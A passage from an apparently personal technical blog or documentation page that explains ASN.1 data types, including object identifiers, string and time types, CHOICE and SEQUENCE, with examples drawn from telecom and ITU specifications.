4 0 0 1 3 52 7}</code>. Only positive integers are allowed including zero (0).</p><p>Another example comes from the CAP-object-identifiers module in ETSI 129.078.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">tc-Messages OBJECT IDENTIFIER ::=</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    {itu-t recommendation q 773 modules(2) messages(1) version3(3)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">id-CAP OBJECT IDENTIFIER ::=</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     umts-network(1) cap4(22)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">id-ac OBJECT IDENTIFIER ::= {id-CAP ac(3)}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>id-ac</code> is a child of the <code>id-CAP</code> object identifier.</p><p>One could lookup object identifiers by visiting this amazing
<a href="https://oidref.com/" target="_blank" rel="noopener noreferrer">page (oidref.com)</a>.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="external">EXTERNAL<a class="hash-link" href="#external" title="Direct link to heading">​</a></h3><p><code>EXTERNAL</code> represents a value that does not need to be specified as a
ASN.1 type. It carries information on how the data should be interpreted.</p><p>{% raw %}```asn.1
Unidirectional {OPERATION:Invokable, OPERATION:Returnable} ::= SEQUENCE {
dialoguePortion  DialoguePortion OPTIONAL,
components       ComponentPortion{{Invokable}, {Returnable}}
}</p><p>DialoguePortion ::= <!-- -->[APPLICATION 11]<!-- --> EXPLICIT EXTERNAL</p><div class="language-{% codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-{% codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Here the value `dialoguePortion` will have tag 11 if specified, it is</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">then up to the application to decide how to deal with the value.</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">### REAL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Values of the type `REAL` will take a triplet of numbers (m, b, e),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">where m is the mantissa (a signed number), b the base (2 or 10), and e</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">the exponent (a signed number).</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">There are also three special values it can take `PLUS-INFINITY`, 0,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">and `MINUS-INFINITY`.</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">```asn.1</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">theBestRealValue REAL ::= (123, 10, -2) -- 1.23</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">maxValue REAL ::= PLUS-INFINITY</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="string-types">String types<a class="hash-link" href="#string-types" title="Direct link to heading">​</a></h3><p>I feel like most of the string types are the same, except that they
all take diffrent character sets. I've already described <code>BIT STRING</code>
and <code>OCTET STRING</code> which both operate the bit set, but there is a
lot of others that operate over character sets.</p><table><thead><tr><th>Type</th><th>Tag</th><th>Character set regex/comment</th></tr></thead><tbody><tr><td>UTF8String</td><td>12</td><td>Synonymous with UniversalString at abstract level</td></tr><tr><td>NumericString</td><td>18</td><td><code>[0-9 ]</code></td></tr><tr><td>PrintableString</td><td>19</td><td><code>[A-Za-z0-9'()+,./:=? -]</code></td></tr><tr><td>TelexString (T61String)</td><td>20</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf" target="_blank" rel="noopener noreferrer">ISOReg</a> reg. #6, #87, #102, #103, #106, #107, #126, #144, #150, #153, #156, #164, #165, #168 + space,delete</td></tr><tr><td>VideotexString</td><td>21</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf" target="_blank" rel="noopener noreferrer">ISOReg</a> reg. #1, #13, #72, #73, #87, #89, #102, #108, #126, #128, #129, #144, #150, #153, #164, #165, #168 + space,delete</td></tr><tr><td>IA5String</td><td>22</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf" target="_blank" rel="noopener noreferrer">ISOReg</a> reg. #1, #6 + space,delete</td></tr><tr><td>GraphicString</td><td>25</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf" target="_blank" rel="noopener noreferrer">ISOReg</a> graphical sets (called 'G') + space</td></tr><tr><td>VisibleString (ISO646String)</td><td>26</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf" target="_blank" rel="noopener noreferrer">ISOReg</a> reg. #6 + space</td></tr><tr><td>GeneralString</td><td>27</td><td><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf" target="_blank" rel="noopener noreferrer">ISOReg</a> graphical sets (called 'G'), control characters (called 'C') + space,delete</td></tr><tr><td>UniversalString</td><td>28</td><td>[ISO10646-1]</td></tr><tr><td>BMPString</td><td>30</td><td>Basic Multilingual Plane; subtype of UniversalString</td></tr></tbody></table><p><a href="https://www.itscj-ipsj.jp/custom_contents/cms/linkfile/ISO-IR.pdf" target="_blank" rel="noopener noreferrer">ISOReg</a>
is a pretty good source, it reference most of the registers but not
all of them as far as I can see.</p><p>I'll list some examples of string types found in our ASN.1 files:</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">AMFNameUTF8String ::= UTF8String (SIZE(1..150, ...))</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DirectoryString ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    teletexString TeletexString (SIZE (1..maxSize)),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    printableString PrintableString (SIZE (1..maxSize)),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    universalString UniversalString (SIZE (1..maxSize)),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    bmpString BMPString (SIZE (1..maxSize))</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">--    utf8String UTF8String (SIZE (1..maxSize))</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DisplayInformation ::= IA5String (SIZE (minDisplayInformationLength..maxDisplayInformationLength))</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>IA5String</code> is used to represent ISO 646 (IA5; International Alphabet 5)
characters.  The entire character set contains precisely 128
characters and are generally equivalent to the first 128 characters of
the ASCII alphabet.</p><p>There are multiple formats for the values of <code>UniversalString</code>, <code>BMPString</code> and
<code>UTF8String</code> types. One could either specify a quadruple with <code>{group,
plane, row, cell}</code> for the character needed, or an array of defined values (strings).</p><p>An example from Dubuisson:</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">latinCapitalLetterA UniversalString ::= {0,0,0,65}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">greekCapitalLetterSigma UniversalString ::= {0,0,3,145}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">my-string UniversalString ::= {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    "This is a capital A: ", latinCapitalLetterA,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ", and a capital alpha: ", greekCapitalLetterAlpha,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    "; try and spot the difference!"}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And X.680 gives us yet another example</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">IMPORTS</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  BasicLatin, greekCapitalLetterSigma</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  FROM ASN1-CHARACTER-MODULE</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    { joint-iso-itu-t asn1(1) specification(0) modules(0) iso10646(0) };</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"> MyAlphabet ::= UniversalString (FROM (BasicLatin | greekCapitalLetterSigma))</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"> mystring MyAlphabet ::= { "abc" , greekCapitalLetterSigma , "def" }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="time-types">Time types<a class="hash-link" href="#time-types" title="Direct link to heading">​</a></h3><p>The <code>UTCTime</code> and <code>GeneralizedTime</code> types are actually specified as
<code>VisibleString</code>.</p><p><code>UTCTime</code> format is "YYMMDD" for date followed by "hhmm" or "hhmmss"
for time, ending with either "z", "-hhmm" or "+hhmm" for time offset.</p><p>Specifying "2021-12-14 04:32 CET" in <code>UTCTime</code></p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">"2112140332Z"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">"2112140432+0100"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>GeneralizedTime</code> gives a bit more flexibility with regards to the format.</p><p>It consists of a calendar date of format "YYYYMMDD", followed by
either "hh", "hhmm", "hhmmss" and optional parts ".<!-- -->[0-9]<!-- -->+", and
optionally ending with the coordinated universal time character "z" or
the time offset in hours/minutes "-hhmm" or "+hhmm".</p><p>These are the same, but one with higher precision and in local time.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">"2021121403.54Z" -- 3.54 hours after midnight</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">"20211214043227.981935+0100" -- 3 hours, 32 minutes, 27 seconds, 981935 microseconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>DATE</code>, <code>TIME-OF-DAY</code>, <code>DATE-TIME</code> and <code>DURATION</code> was introduced after
the third generation of ISO 8601 was released 2004.</p><p>They are defined as subsets of <code>TIME</code>.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">DATE ::= [UNIVERSAL 31] IMPLICIT TIME</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">       (SETTINGS "Basic=Date Date=YMD Year=Basic")</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">TIME-OF-DAY ::= [UNIVERSAL 32] IMPLICIT TIME</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">       (SETTINGS "Basic=Time Time=HMS Local-or-UTC=L")</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DATE-TIME ::= [UNIVERSAL 33] IMPLICIT TIME</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">       (SETTINGS "Basic=Date-Time Date=YMD Year=Basic Time=HMS Local-or-UTC=L")</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DURATION ::= [UNIVERSAL 34] IMPLICIT TIME</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">       (SETTINGS "Basic=Interval Interval-type=D")</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>As I can find no real world examples from our ASN.1-files, I'm forced
to make-up examples of these</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">date1 DATE ::= "211214"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">time1 TIME-OF-DAY ::= "043227"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">date-time1 DATE-TIME ::= "211214043227"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">duration1 DURATION ::= "P0Y29M0DT0H0M0S" -- 29 months to an accuracy of 1 second</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Values of type <code>DURATION</code> starts with "P" followed by alot of
different optional parts and formats.  If the time designation is used
it should start with a "T" to keep months and minutes separate.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">duration2 DURATION ::= "P2MT2M" -- 2 months and 2 minutes</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">duration3 DURATION ::= "P29M0DT0.00M" -- 29 months with accuracy of one-hundredth of a minute</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">duration4 DURATION ::= "P32W" -- 32 weeks</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="structured-types">Structured types<a class="hash-link" href="#structured-types" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="choice">CHOICE<a class="hash-link" href="#choice" title="Direct link to heading">​</a></h3><p>The type <code>CHOICE</code> can take values from one of multiple types, <code>CHOICE</code>
doesn't have it's own universal tag.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">CancelArg ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    invokeID        [0] InvokeID,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    allRequests     [1] NULL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The value of type <code>CancelArg</code> will either of an <code>InvokeID</code> type, or a
<code>NULL</code> type.  It will be tagged <code>[0]</code> or <code>[1]</code> respectively, that is
why <code>CHOICE</code> doesn't have it's own universal tag, as it is derived
from ASN.1 specification.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="sequence-of">SEQUENCE (OF)<a class="hash-link" href="#sequence-of" title="Direct link to heading">​</a></h3><p><code>SEQUENCE</code> and <code>SEQUENCE OF</code> are used for composing multiple types.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">EventTypeSMS ::= ENUMERATED {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    sms-CollectedInfo                   (1),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    o-smsFailure                        (2),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    o-smsSubmission                     (3),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    sms-DeliveryRequested               (11),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    t-smsFailure                        (12),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    t-smsDelivery                       (13)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">MonitorMode ::= ENUMERATED {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    interrupted                         (0),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    notifyAndContinue                   (1),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    transparent                         (2)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">SMSEvent ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    eventTypeSMS   [0] EventTypeSMS,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    monitorMode    [1] MonitorMode</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Tone ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    toneID         [0] Integer4,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    duration       [1] Integer4 OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>A value of the <code>SMSEvent</code> type have information on both <code>EventTypeSMS</code>
and <code>MonitorMode</code>. The fixed number of fields in the <code>SEQUENCE</code> type
are ordered.  Context-specific tagging (e.g. the <code>[0]</code>, <code>[1]</code>, <code>[2]</code>
stuff in the examples), is frequently applied for the structured
types, but one could also utilize the keywords <code>AUTOMATIC TAGGING</code> in
the module definition.</p><p><code>SEQUENCE OF</code> on the other hand, holds an arbitrary number of fields
of a single type.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">FilterItem ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    equality         [0] AttributeValueAssertion,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    substrings       [1] SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        type    ATTRIBUTE.&amp;id({SupportedAttributes}),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        strings SEQUENCE OF CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            initial [0] ATTRIBUTE.&amp;Type({SupportedAttributes}{@substrings.type}),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            any     [1] ATTRIBUTE.&amp;Type({SupportedAttributes}{@substrings.type}),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            final   [2] ATTRIBUTE.&amp;Type({SupportedAttributes}{@substrings.type})</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    greaterOrEqual   [2] AttributeValueAssertion,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    lessOrEqual      [3] AttributeValueAssertion,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    present          [4] AttributeType,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    approximateMatch [5] AttributeValueAssertion,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    extensibleMatch  [6] 